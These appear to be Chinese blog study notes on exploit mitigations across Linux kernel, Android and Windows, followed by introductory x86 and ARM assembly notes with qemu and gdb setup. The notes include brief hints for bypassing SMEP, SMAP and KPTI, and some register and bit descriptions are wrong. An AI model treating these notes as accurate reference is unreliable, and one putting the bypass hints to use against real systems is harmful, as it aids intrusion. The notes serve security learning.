<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *tcb;		<span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">			   thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="type">dtv_t</span> *dtv;</span><br><span class="line">  <span class="type">void</span> *self;		<span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="type">int</span> multiple_threads;</span><br><span class="line">  <span class="type">int</span> gscope_flag;</span><br><span class="line">  <span class="type">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="type">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="type">uintptr_t</span> pointer_guard;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">int</span> unused_vgetcpu_cache[<span class="number">2</span>];</span><br><span class="line">  <span class="comment">/* Bit 0: X86_FEATURE_1_IBT.</span></span><br><span class="line"><span class="comment">     Bit 1: X86_FEATURE_1_SHSTK.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> feature_1;</span><br><span class="line">  <span class="type">int</span> __glibc_unused1;</span><br><span class="line">  <span class="comment">/* Reservation of some values for the TM ABI.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_tm[<span class="number">4</span>];</span><br><span class="line">  <span class="comment">/* GCC split stack support.  */</span></span><br><span class="line">  <span class="type">void</span> *__private_ss;</span><br><span class="line">  <span class="comment">/* The marker for the current shadow stack.  */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="type">int</span> ssp_base;</span><br><span class="line">  <span class="comment">/* Must be kept even if it is no longer used by glibc since programs,</span></span><br><span class="line"><span class="comment">     like AddressSanitizer, depend on the size of tcbhead_t.  */</span></span><br><span class="line">  __128bits __glibc_unused2[<span class="number">8</span>][<span class="number">4</span>] __attribute__ ((<span class="built_in">aligned</span> (<span class="number">32</span>)));</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *__padding[<span class="number">8</span>];</span><br><span class="line">&#125; <span class="type">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>

<p>per-cpu 变量的引入是为了实现per-task的stack canary, 每个cpu上同时只能运行一个进程&#x2F;线程, per cpu变量可以随进程的切换而切换，故通过一个per-cpu变量完全可以为每个进程&#x2F;线程解引用到不同的canary地址(后续称为per-cpu canary),以实现per-task的canary.</p>
<h3 id="kernel"><a href="#kernel" class="headerlink" title="kernel"></a>kernel</h3><h4 id="kaslr"><a href="#kaslr" class="headerlink" title="kaslr"></a>kaslr</h4><p>kernel address space layout randomize</p>
<p>在开启了 KASLR 的内核中，内核的代码段基地址等地址会整体偏移。</p>
<h4 id="smap"><a href="#smap" class="headerlink" title="smap"></a>smap</h4><p>Supervisor Mode Access Prevention，管理模式访问保护。</p>
<p>如果内核态可以访问用户态的数据，也会出现问题。比如在劫持控制流后，攻击者可以通过栈迁移将栈迁移(pop rsp类似的指令)到用户态，然后进行 ROP，进一步达到提权的目的。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的。x86 下对应的保护机制的名字为 SMAP。CR4 寄存器中的第 21 位用来标记是否开启 SMEP 保护。</p>
<p>x86CPU的特性，需要CPU和操作系统支持。bypass: 修改cr4</p>
<h4 id="smep"><a href="#smep" class="headerlink" title="smep"></a>smep</h4><p>Supervisor Mode Execution Prevention，管理模式执行保护。</p>
<p>在内核态执行代码时，可以直接执行用户态的代码。那如果攻击者<strong>控制了内核中的执行流，就可以执行处于用户态的代码</strong>。由于用户态的代码是攻击者可控的，所以更容易实施攻击。为了防范这种攻击，研究者提出当位于内核态时，不能执行用户态的代码。</p>
<p>在 Linux 内核中，这个防御措施的实现是与<strong>指令集架构相关</strong>的(ARM PXN)。x86下 <code>CR4</code> 寄存器中的第 20 位用来标记是否开启 SMEP 保护。</p>
<p>查看是否开启</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep smap /proc/cpuinfo  <span class="comment"># 如果出现结果，说明开启</span></span><br></pre></td></tr></table></figure>

<p>bypass: 修改cr4</p>
<h4 id="kpti"><a href="#kpti" class="headerlink" title="kpti"></a>kpti</h4><p>Kernel Page Table Isolation，内核页表隔离</p>
<p>在 x86_64 的 PTI 机制中，<strong>内核态的用户空间内存映射部分被全部标记为不可执行</strong>。也就是说，之前不具有 SMEP 特性的硬件，如果开启了 KPTI 保护，也具有了类似于 SMEP 的特性。此外，SMAP 模拟也可以以类似的方式引入，只是现在还没有引入。因此，在目前开启了 KPTI 保护的内核中，如果没有开启 SMAP 保护，那么内核仍然可以访问用户态空间的内存，只是不能跳转到用户态空间执行 Shellcode。</p>
<p>bypass</p>
<ul>
<li>signal handler</li>
<li>swapgs_restore_regs_and_return_to_usermode 函数中存在可以改变 cr3 的gadget</li>
</ul>
<h4 id="fgkaslr"><a href="#fgkaslr" class="headerlink" title="fgkaslr"></a>fgkaslr</h4><p>FGKASLR 在 KASLR 基地址随机化的基础上，在加载时刻，以函数粒度重新排布内核代码。目前，FGKASLR 只支持 <strong>x86_64</strong> 架构。</p>
<p>FGKASLR 利用 gcc 的编译选项 <code>-ffunction-sections</code> 把内核中不同的函数放到不同的 section 中。 在编译的过程中，任何使用 C 语言编写的函数以及不在特殊输入节的函数都会单独作为一个节；使用汇编编写的代码会位于一个统一的节中。</p>
<p>如果想要开启内核的 FGKASLR，你需要开启 <code>CONFIG_FG_KASLR=y</code> 选项。</p>
<h4 id="Kernel-Stack-Canary"><a href="#Kernel-Stack-Canary" class="headerlink" title="Kernel Stack Canary"></a>Kernel Stack Canary</h4><p>在编译内核时，我们可以设置 CONFIG_CC_STACKPROTECTOR 选项，来开启该保护</p>
<p>在 x86 架构中，同一个 task 中使用相同的 Canary。</p>
<h2 id="Android"><a href="#Android" class="headerlink" title="Android"></a>Android</h2><blockquote>
<p>安卓使用 Linux Kernel，有些保护并非特有，而是是否默认开启。</p>
</blockquote>
<h3 id="pxn"><a href="#pxn" class="headerlink" title="pxn"></a>pxn</h3><p>Privileged Execute-Never。内核安全特性，用来阻止内核直接执行用户空间的代码，能够极大地提升漏洞利用的难度。</p>
<p>和 smep 一个性质</p>
<p>armv8及以上版本的PXN特性由硬件支持，Android 5 arm64后开启，Android通过页表来开启PXN。</p>
<h3 id="pan"><a href="#pan" class="headerlink" title="pan"></a>pan</h3><p>smap 类似的性质</p>
<h3 id="cfi"><a href="#cfi" class="headerlink" title="cfi"></a>cfi</h3><p>Control-Flow Integrity 控制流完整性</p>
<p>其核心思想是<strong>限制程序运行中的控制转移，使之始终处于原有的控制流图所限定的范围内</strong>。具体做法是通过分析程序的控制流图，获取间接转移指令（包括间接跳转、间接调用、和函数返回指令）目标的白名单，并在运行过程中，核对间接转移指令的目标是否在白名单中。控制流劫持攻击往往会违背原有的控制流图，CFI使得这种攻击行为难以实现，从而保障软件系统的安全。</p>
<p>内核 CFI 手动启用，x86通过此开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONFIG_CFI_CLANG=y</span><br></pre></td></tr></table></figure>

<h3 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h3><p>Android 8.0之后推出厂商升级成本大大降低，8.0之后增加vendor.img镜像 ，攻击面大大减少， 很多厂商的代码不与应用层直接交互， 增加了应用和厂商代码的SELinux限制</p>
<h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><h3 id="ASLR"><a href="#ASLR" class="headerlink" title="ASLR"></a>ASLR</h3><p>与 Linux 相同，ASLR 保护指的是地址随机化技术(Address Space Layout Randomization)，这项技术将在程序启动时将 DLL 随机的加载到内存中的位置，这将缓解恶意程序的加载。ASLR 自 Windows 10 开始已经在系统中被配置为默认启用。</p>
<p>不同于linux的是，windows下的ASLR基地址在每次开机后都是一致的，关机后改变</p>
<h3 id="DEP"><a href="#DEP" class="headerlink" title="DEP"></a>DEP</h3><p>Data Execute Protector</p>
<p><code>VirtualAlloc()</code>可以设置权限，设置为&#96;</p>
<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>这个保护类似于 Linux 中的 Canary 保护，一旦开启，会在返回地址和 BP 之前压入一个额外的 <strong>Security Cookie</strong>。系统会比较栈中的这个值和原先存放在 .data 中的值做一个比较。如果两者不吻合，说法栈中发生了溢出。</p>
<h3 id="NET"><a href="#NET" class="headerlink" title=".NET"></a>.NET</h3><p>DLL 混淆级保护。</p>
<h3 id="Isolation"><a href="#Isolation" class="headerlink" title="Isolation"></a>Isolation</h3><p>被称为隔离保护，一旦开启，表示此程序加载时将会在一个相对独立的隔离环境中被加载，从而阻止攻击者过度提升权限。</p>
<h3 id="SEH"><a href="#SEH" class="headerlink" title="SEH"></a>SEH</h3><p>结构化异常处理（Structured Exception Handling，简称 SEH）是一种 <code>Windows</code> 操作系统对错误或异常提供的处理技术。为Windows 的程序设计者提供了程序错误或异常的处理途径，使得系统更加健壮。</p>
<h3 id="SafeSEH"><a href="#SafeSEH" class="headerlink" title="SafeSEH"></a>SafeSEH</h3><p>安全结构化异常处理函数，即白名单安全沙箱，事先定义一些异常处理程序，并基于此构造安全结构化异常处理表，程序正式运行后，安全结构化异常处理表之外的异常处理程序将会被阻止运行。</p>
<h3 id="SMEP-SMAP"><a href="#SMEP-SMAP" class="headerlink" title="SMEP SMAP"></a>SMEP SMAP</h3><p>windows10 之后引入 SMEP和SMAP</p>
<h3 id="KVAS"><a href="#KVAS" class="headerlink" title="KVAS"></a>KVAS</h3><p>内核虚拟地址影子（Kernel Virtual Address Shadow，由微软提出的一个术语，简称KVAS），由于该特性仅允许用户模式代码访问有限的内核内存，因此能有效防范Meltdown攻击。是微软在Windows系统上对KPTI的具体实现方式</p>
<p>Virtualization-Based Security (VBS)</p>
<p>Hypervisor Protected Code Integrity (HVCI)</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><ul>
<li><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/defense/readme/">CTF-wili</a></li>
<li><a href="https://source.android.google.cn/docs/security/test/cfi?hl=zh-cn">android CFI</a></li>
<li><a href="https://clang.llvm.org/docs/ControlFlowIntegrity.html">Control Flow Integrity — Clang</a></li>
<li><a href="https://www.cnblogs.com/pwnfeifei/p/17162374.html">windows pwn</a></li>
<li><a href="https://a1ex.online/2020/10/15/Windows-Pwn%E5%AD%A6%E4%B9%A0/">Windows_Pwn学习</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>程序缓解机制</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编学习</title>
    <url>/2023/06/10/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<blockquote>
<p>基本的汇编学习。</p>
</blockquote>
<span id="more"></span>

<p>学习目标：首先能看懂。然后尝试编写 <code>shellcode</code>。</p>
<p>个人习惯小写指令。</p>
<ul>
<li><code>little-endian</code></li>
</ul>
<p>常见的汇编格式</p>
<ul>
<li>Intel格式。</li>
<li>AT&amp;T，实际使用也很常见(Linux中默认的格式)</li>
</ul>
<p>部分名词</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">ISA: Instruction Set Architecture, 指令集架构</span><br><span class="line">RISC: Reduced Instruction Set Computer, 精简指令集计算机</span><br><span class="line">CISC: Complex Instruction Set Computer, 复杂指令集计算机</span><br><span class="line">ABI: application binary interface</span><br></pre></td></tr></table></figure>

<h2 id="环境问题"><a href="#环境问题" class="headerlink" title="环境问题"></a>环境问题</h2><p>本机 linux: ubuntu &amp;&amp; kali virtual machine；CPU: AMD。</p>
<ul>
<li>无法直接运行 <code>arm</code> 和 <code>mips</code> 架构的程序</li>
<li>arm可以使用手机终端 <a href="https://termux.dev/en/">Termux</a> 进行运行。或者购买云服务器?</li>
</ul>
<h3 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a>环境安装</h3><p>基本环境 <code>user mode+kernel mode</code>。 </p>
<ul>
<li>运行程序只需要一个<code>qemu-user</code> 就行，启动系统需要 <code>qemu-system-xxx</code></li>
<li>甚至可以 <code>qemu-system</code> 跑kernel，然后跑程序😂</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># qemu user用户态 system启动内核镜像</span></span><br><span class="line">sudo apt install qemu-user</span><br></pre></td></tr></table></figure>

<p>arm 环境</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链 + 动态链接库</span></span><br><span class="line">sudo apt list gcc* | grep arm</span><br><span class="line">sudo apt install gcc-arm-linux-gnueabi gcc-aarch64-linux-gnu</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu arm system mode</span></span><br><span class="line">sudo apt list  <span class="string">&quot;qemu*&quot;</span> <span class="comment"># 寻找对用的arch</span></span><br><span class="line">sudo apt install qemu-system-arm qemu-system-aarch64</span><br></pre></td></tr></table></figure>

<p>mips 环境.</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># gun 编译工具链</span></span><br><span class="line">sudo apt install gcc-mips-linux-gnu gcc-mips64-linux-gnuabi64 gcc-mipsel-linux-gnu gcc-mips64el-linux-gnuabi64</span><br><span class="line"></span><br><span class="line"><span class="comment"># optional: qemu mips system mode, 目前没见过， user mode 应该够了</span></span><br><span class="line">sudo apt install qemu-system-mips</span><br></pre></td></tr></table></figure>

<p>gdb</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt install gdb gdb-multiarch</span><br></pre></td></tr></table></figure>

<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>qemu-user 使用 <code>-g</code> gdb模式 确定gdb调试端口</p>
<p>qemu-system 使用 <code>-s -S  或者 -gdb tcp:1234</code> gdbserver等待连接，默认端口 <code>1234</code></p>
<p>编程测试</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;hello, world!&quot;</span>);</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>寻找动态链接库。<code>lib-&gt;/usr/lib</code> 的链接</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">ls</span> -al /usr/lib | grep arm  <span class="comment"># aarch64 mips...</span></span><br></pre></td></tr></table></figure>

<p>arm 测试，不知为什么，测试时 <code>-g</code>放前面才成功</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 编译</span></span><br><span class="line">arm-linux-gnueabi-gcc hello.c -o helloarm -g</span><br><span class="line">aarch64-linux-gnu-gcc hello.c -o helloaarch -g</span><br><span class="line"></span><br><span class="line"><span class="comment"># 运行</span></span><br><span class="line">$ qemu-arm -L /usr/arm-linux-gnueabi ./helloarm</span><br><span class="line">$ qemu-aarch64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调试</span></span><br><span class="line">$ qemu-arm -g 1234 -L /usr/arm-linux-gnueabi ./helloarm </span><br><span class="line">$ gdb-multiarch</span><br><span class="line">gdb&gt; <span class="built_in">set</span> <span class="built_in">arch</span> arm <span class="comment"># aarch64</span></span><br><span class="line">gdb&gt; target remote localhost:1234</span><br><span class="line">xxx </span><br></pre></td></tr></table></figure>

<p>mips 测试, 与arm类似</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ mips-linux-gnu-gcc hello.c -o hellomips -g</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><p>CISC</p>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><p>intel x86 通用寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 通用</span><br><span class="line">eax: 累加器</span><br><span class="line">ebx: 一般基址寄存器，base</span><br><span class="line">ecx: counter, 在loop时，默认计数</span><br><span class="line">edx: 一般用于存放data</span><br><span class="line"></span><br><span class="line">esi: source index, 处理字符串常用</span><br><span class="line">edi: destinatin index, 处理字符串常用</span><br><span class="line"></span><br><span class="line">esp: stack pointer, 栈顶</span><br><span class="line">ebp: base pointer, 栈基址</span><br><span class="line"></span><br><span class="line">eip: 指向将要执行的指令。</span><br></pre></td></tr></table></figure>

<p>标志位 <code>eflags</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CF: carry flag, 进位</span><br><span class="line">ZF: zero, 0</span><br><span class="line">SF: sign, 符号</span><br><span class="line">OF: overflow, 溢出</span><br><span class="line">TF: trap, 跟踪</span><br><span class="line">IF: interrupt, 中断</span><br><span class="line">PF: parity, 奇偶</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>段寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cs: code segment 代码段</span><br><span class="line">ds: data 数据段</span><br><span class="line">ss: stack 堆栈段</span><br><span class="line">es: extend 扩展段</span><br><span class="line">fs: 数据段</span><br><span class="line">gs: 数据段</span><br></pre></td></tr></table></figure>

<p>控制寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 某些保护模式</span><br><span class="line">cr0-cr4</span><br></pre></td></tr></table></figure>

<p>寻址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov</span><br><span class="line">lea</span><br></pre></td></tr></table></figure>

<p>算术指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 基本运算</span><br><span class="line">add</span><br><span class="line">sub</span><br><span class="line">mul</span><br><span class="line">div</span><br><span class="line">inc</span><br><span class="line">dec</span><br><span class="line"></span><br><span class="line">; 逻辑运算</span><br><span class="line">cmp</span><br><span class="line">and</span><br><span class="line">or</span><br><span class="line">xor</span><br><span class="line">not</span><br><span class="line"></span><br><span class="line">; 移位操作</span><br><span class="line">shl  ; shift left</span><br><span class="line">shr</span><br><span class="line">sal  ; shift arithmetic left 算数左移</span><br><span class="line">sar</span><br></pre></td></tr></table></figure>

<p>跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; jmp 类</span><br><span class="line">jmp</span><br><span class="line">jb   ; blow</span><br><span class="line">jg   ; greater</span><br></pre></td></tr></table></figure>

<p>函数调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call function</span><br><span class="line">; call 执行时，保存 eip+4, 并跳转到对应地址</span><br><span class="line">; 参数传递，使用栈传递参数</span><br></pre></td></tr></table></figure>

<p>栈帧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 在调用子程序时，会开辟子程序的栈帧。esp和ebp保存栈顶和栈底</span><br><span class="line">; 在返回父程序需要还原esp, ebp指针。</span><br><span class="line">; 栈 低地址生长</span><br><span class="line"></span><br><span class="line">; sp自动变化</span><br><span class="line">push ebx  ; sp-4</span><br><span class="line">pop rax   ; sp+4</span><br></pre></td></tr></table></figure>

<p>系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 系统中断处理syscall</span><br><span class="line">int 0x80            ; eax系统调用号 ebx, ecx, edx对应函数前三个参数</span><br></pre></td></tr></table></figure>


<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86-64"></a>x86-64</h3><p>实际上x86-64与AMD64基本是同一个ISA，现在我们使用购买的Intel或者AMD生产的CPU，都属于x86-64的ISA。</p>
<p>x86-64: 64位，可寻址 <code>2^64</code>, 兼容x86</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 32位 r-&gt;b比如 rax-&gt;eax</span><br><span class="line">rax, rbx, rcx, rdx</span><br><span class="line">rsi, rdi</span><br><span class="line">rsp, rbp</span><br><span class="line">r8: r8d 32位 寄存器，低32位</span><br><span class="line">r9: r9d</span><br><span class="line">r10: ...</span><br><span class="line">r11: ...</span><br><span class="line">r12: ...</span><br><span class="line">r13: ...</span><br><span class="line">r14: ...</span><br><span class="line">r15: ...</span><br></pre></td></tr></table></figure>


<p>Linux下函数调用约定, 与x86相差较大</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 函数参数</span><br><span class="line">rdi, rsi, rdx, rcx, r8, r9           ; 传递前6个参数，第7个参数开始和x86一样使用栈传递</span><br><span class="line"></span><br><span class="line">; 返回值</span><br><span class="line">rax</span><br></pre></td></tr></table></figure>

<p>系统调用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; syscall</span><br><span class="line">rax: 系统调用号</span><br><span class="line">; 参数传递与函数一致， rdi, rsi...</span><br></pre></td></tr></table></figure>

<h2 id="ARM"><a href="#ARM" class="headerlink" title="ARM"></a>ARM</h2><p>RISC</p>
<p>ARM指令格式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">label op-code oprand1 oprand2 oprand3 ...        @commit</span><br><span class="line"></span><br><span class="line">@ 更加学术 rd: destination; rn: 寄存器中用于算术运算的操作数; shifter_operand: 数据处理指令</span><br><span class="line">&lt;opcode&gt; &#123;&lt;cond&gt;&#125; &#123;S&#125; &lt;rd&gt;,&lt;rn&gt;,&lt;shifter_operand&gt;</span><br><span class="line"></span><br><span class="line">@ 注释  `@`, `//`  `/**/` `;`</span><br></pre></td></tr></table></figure>

<h3 id="ARMv7"><a href="#ARMv7" class="headerlink" title="ARMv7"></a>ARMv7</h3><p>32位指令集<code>A32</code>，兼容16位指令集<code>T16</code></p>
<ul>
<li>由于ARMv7 兼容 <code>ARM</code>和 <code>Thumb</code>指令集，区分两个指令集： <code>addr &amp; 1 == 1</code>代表<code>thumb</code>指令集</li>
</ul>
<p>ARMv7通用寄存器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">r0-r3: args, 函数前四个参数，返回值也会存入r0. </span><br><span class="line">r4-r10:  </span><br><span class="line">r11: fp, frame pointer</span><br><span class="line">r12: ip, Intra-Procedure-call scratch register, 在新版本当作通用寄存器使用，会在bl时引发bug</span><br><span class="line">r13: sp, stack pointer</span><br><span class="line">r14: lr, link register</span><br><span class="line">r15: pc, program count, 指向下一条需要执行的指令</span><br></pre></td></tr></table></figure>

<p>标志位(CPSR: program status reg),如果想改变，需要在某些指令后加 <code>s</code> (sub -&gt; subs)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">N: negative, 运算结果&gt;=0 N=0, 负数，N=1</span><br><span class="line">Z: zero, 为0</span><br><span class="line">C: carry, 进位</span><br><span class="line">V: overflow 有溢出</span><br><span class="line"></span><br><span class="line">; cmp 可以改变</span><br><span class="line">cmp r0, r1</span><br></pre></td></tr></table></figure>

<p>mov 立即数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov r0, #1     @ r0 &lt;- 1</span><br><span class="line"></span><br><span class="line">@ 特殊寄存器 cpsr || spsr</span><br><span class="line">mrs r0, cpsr   @ r0 &lt;- cpsr</span><br><span class="line">msr cpsr, r1   @ cpsr &lt;- r1</span><br></pre></td></tr></table></figure>

<p>访问内存</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 不能直接像intel mov访问内存, 使用 load, store命令间接访问内存</span><br><span class="line">ldr rd, [rn , #offset]   @ load register</span><br><span class="line">str rd, [rn, #offset]</span><br><span class="line">ldm                      @ load multiple</span><br><span class="line">stm  </span><br><span class="line"></span><br><span class="line">; 例子</span><br><span class="line">ldr r0, =0X20000002  @ r0=0X20000002，加载地址到寄存器 </span><br><span class="line">str r1, [r0]         @ r1 中的值写入到 r0 中所保存的地址中</span><br></pre></td></tr></table></figure>

<p>算术指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 基本算数运算</span><br><span class="line">add rd, rn, rm   @ rd = rn + rm</span><br><span class="line">sub rd, rn, rm   @ rd = rn - rm</span><br><span class="line">mul rd, rn, rm   @ rd = rn * rm</span><br><span class="line">sdiv rd, rn, rm  @ rd = rn / rm, s(ign)div u(nsign)div</span><br><span class="line"></span><br><span class="line">@ 想改变标志位, 加 &#x27;s&#x27; =&gt; subs...</span><br><span class="line"></span><br><span class="line">@ 逻辑运算</span><br><span class="line">and rd, rn       @ rd = rd &amp; rn</span><br><span class="line">and rd, rn, #imm @ rd = rn &amp; #imm</span><br><span class="line">orr rd, rn       @ rd = rd | rn</span><br><span class="line">eor rd, rn       @ rd = rd ^ rn</span><br><span class="line"></span><br><span class="line">@ 移位操作</span><br><span class="line">lsl   @ logic shift left 逻辑左移</span><br><span class="line">lsr   @ 逻辑右移</span><br><span class="line">asr   @ arithmetic shift right 算数右移</span><br><span class="line">ror   @ rotate right 循环右移</span><br></pre></td></tr></table></figure>


<p>程序跳转</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b: 直接跳到label。 branch</span><br><span class="line">bx: 跳转+状态切换    @ ARM/Thumb 模式(使用一次，切换一次)</span><br><span class="line">bl: b + link, 首先保存下一条指令地址到lr, 然后改变pc。</span><br><span class="line">blx: bl+bx</span><br><span class="line"></span><br><span class="line">@ 条件跳转, 状态寄存器</span><br><span class="line">eq: equal 相等</span><br><span class="line">ne: not eq</span><br><span class="line">lt: less </span><br><span class="line">le: less equal</span><br></pre></td></tr></table></figure>

<p>函数调用 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 仍然是使用 `b` 指令调用函数</span><br></pre></td></tr></table></figure>

<p>栈帧相关</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ sp, fp 维护栈帧的状态, 栈向 低地址生长</span><br><span class="line"></span><br><span class="line">fp -&gt; +-------+</span><br><span class="line">      | frame |</span><br><span class="line">sp -&gt; +-------+</span><br><span class="line"></span><br><span class="line">@ push/pop 可以操作多个寄存器，甚至可以控制pc; sp自动变化</span><br><span class="line">@ 下面是常见的函数调用出现出现的gadget </span><br><span class="line">push &#123;r0-r4, lr&#125;           @ 顺序是 push r12; push r4; push r3 ...</span><br><span class="line">...</span><br><span class="line">pop &#123;r0-r4, pc&#125;            @ 顺序是  pop r0; pop r1; ...</span><br><span class="line"></span><br><span class="line">@ 等价于 push, 先计算sp的值?</span><br><span class="line">stmfd sp!, &#123;r0-r4, r12&#125;</span><br><span class="line"></span><br><span class="line">@ 等价于 pop</span><br><span class="line">ldmfd sp!, lr</span><br></pre></td></tr></table></figure>

<p>系统中断</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 通过vector_swi/svc 获得系统调用号</span><br><span class="line">swi #imm</span><br><span class="line">svc #imm</span><br><span class="line"></span><br><span class="line">@ O(old)ABI 形式</span><br><span class="line">mov r0, #34</span><br><span class="line">swi 12</span><br><span class="line"></span><br><span class="line">@ E(extended)ABI 形式，立即数 imm被忽略,由r0决定</span><br><span class="line">mov r0, #12</span><br><span class="line">mov r1, #34</span><br><span class="line">swi 0</span><br></pre></td></tr></table></figure>

<h3 id="ARMv8"><a href="#ARMv8" class="headerlink" title="ARMv8"></a>ARMv8</h3><p>与 <code>armv7</code> 存在一定的区别</p>
<p>64位指令集 <code>aarch64</code>, 兼容32位 <code>aarch32</code></p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">aarch64: 64-bit registers and memory accesses, new instruction set；</span><br><span class="line">aarch32: backwards compatible with ARMv7-A</span><br></pre></td></tr></table></figure>

<p>ARMv8 通用寄存器</p>
<figure class="highlight arm"><table><tr><td class="code"><pre><span class="line"><span class="symbol">x0</span>-x31</span><br><span class="line"><span class="symbol">x0</span>-<span class="built_in">x7</span>: 函数前<span class="number">8</span>个参数值</span><br><span class="line"><span class="symbol">x8:</span> 函数返回值</span><br><span class="line"><span class="symbol">x19</span>-<span class="built_in">x28</span>: 没特殊用途 </span><br><span class="line"><span class="symbol">x29:</span> <span class="built_in">fp</span> frame pointer</span><br><span class="line"><span class="symbol">x30:</span> <span class="built_in">lr</span></span><br><span class="line"><span class="symbol">x31:</span> zr, zero register, 恒<span class="number">0</span></span><br><span class="line"><span class="symbol">x32:</span> <span class="built_in">pc</span>, 不能像armv7一样被修改</span><br><span class="line"></span><br><span class="line"><span class="comment">@ 也可使用32位的 w0...寄存器, 可扩展使用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">@ sp对应的物理寄存器有如下四个(某一时刻只能对应下面其中一个)</span></span><br><span class="line"><span class="symbol">SP_EL0</span>和SP_EL1</span><br><span class="line"><span class="symbol">SP_EL2</span></span><br><span class="line"><span class="symbol">SP_EL3</span></span><br></pre></td></tr></table></figure>

<p>SPSR 替代了 CPSR</p>
<p>内存访问</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ load &amp; store, 兼容armv7 ldr</span><br><span class="line">ldp  @ load pair 一对。</span><br><span class="line">	ldp x8, x2, [x0, #0x10]   @ 将x8&lt;-(x0+0x10), x2&lt;-(x0+0x10+8)</span><br><span class="line">stp  @ store pair</span><br></pre></td></tr></table></figure>

<p>函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@ 参数传递</span><br><span class="line">x0-x7: 函数前8个参数值</span><br><span class="line">x8: 函数返回值</span><br><span class="line"></span><br><span class="line">@ aarch64没有push和pop 指令</span><br></pre></td></tr></table></figure>

<p>系统调用</p>
